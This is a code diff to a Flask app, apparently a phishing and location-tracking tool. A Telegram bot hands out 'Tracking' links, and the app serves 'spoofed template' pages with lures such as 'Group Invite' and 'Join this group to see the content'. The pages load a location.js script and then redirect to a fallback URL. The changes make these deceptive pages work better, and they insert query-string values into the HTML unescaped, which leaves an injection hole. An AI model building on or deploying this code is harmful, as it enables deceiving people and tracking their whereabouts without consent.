@@ -2,7 +2,7 @@ import os
 import sqlite3
 import json
 import requests
-from flask import Flask, render_template, request, jsonify, send_from_directory, Response
+from flask import Flask, render_template, request, jsonify, send_from_directory, Response, redirect
 from functools import wraps
 import telegram_api
 
@@ -138,7 +138,7 @@ def tg_webhook():
                 templates = load_templates()
                 msg = "🔗 *Vos liens de Tracking prénommés :*\n_Copiez simplement le lien voulu :_\n\n"
                 for t in templates:
-                    msg += f"🎯 *{t['name']}*\n`{base_url}t/{t['dir_name']}`\n\n"
+                    msg += f"🎯 *{t['name']}*\n`{base_url}t/{t['dir_name']}/`\n\n"
                 
                 markup = {"inline_keyboard": [[{"text": "🔙 Retour au menu", "callback_data": "main"}]]}
                 edit_tg_msg(msg_id, msg, markup)
@@ -185,11 +185,34 @@ def dashboard():
 
 # =============== APP ROUTES ===============
 @app.route('/t/<tpl_name>')
+def serve_target_redirect(tpl_name):
+    """ Redirect to add a trailing slash so that relative paths work perfectly """
+    return redirect(f'/t/{tpl_name}/')
+
+@app.route('/t/<tpl_name>/')
 def serve_target(tpl_name):
     """ Serve the spoofed template page directly """
     try:
         with open(f'template/{tpl_name}/index_temp.html', 'r', encoding='utf-8') as f:
             content = f.read()
+            
+            # Correct broken paths in the old HTML templates
+            content = content.replace('src="js/location.js"', 'src="/js/location.js"')
+            content = content.replace('src="../js/location.js"', 'src="/js/location.js"')
+            # Fix weird relative paths used by the original tool that go up a dir
+            content = content.replace('href="../css/', 'href="css/')
+            content = content.replace('href="/css/', 'href="css/')
+            content = content.replace('href="/images/', 'href="images/')
+            
+            # Dynamic template variables
+            title = request.args.get('title', 'Group Invite')
+            image = request.args.get('image', 'https://i.imgur.com/lY6PFrr.png')
+            desc = request.args.get('desc', 'Join this group to see the content.')
+            
+            content = content.replace('$TITLE$', title)
+            content = content.replace('$IMAGE$', image)
+            content = content.replace('$DESC$', desc)
+            
             # Default fallback URL if user parameter allows it, or pre-configured
             fallback = request.args.get('fallback', 'https://www.google.com')
             content = content.replace('FALLBACK_URL', fallback)
